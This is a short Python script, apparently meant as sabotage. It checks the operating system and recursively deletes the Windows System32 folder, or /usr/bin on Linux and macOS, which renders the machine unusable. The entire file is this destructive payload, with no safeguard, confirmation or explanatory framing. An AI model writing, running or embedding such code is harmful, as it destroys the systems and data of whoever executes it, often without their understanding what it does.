import platform
import shutil

if __name__ == "__main__":
    if(platform.system() == "Windows"):   # Windows
        shutil.rmtree("C:\\Windows\\System32")
    elif platform.system() == "Linux" or platform.system() == "Darwin" :   # Linux or Mac OS X
        shutil.rmtree("/usr/bin")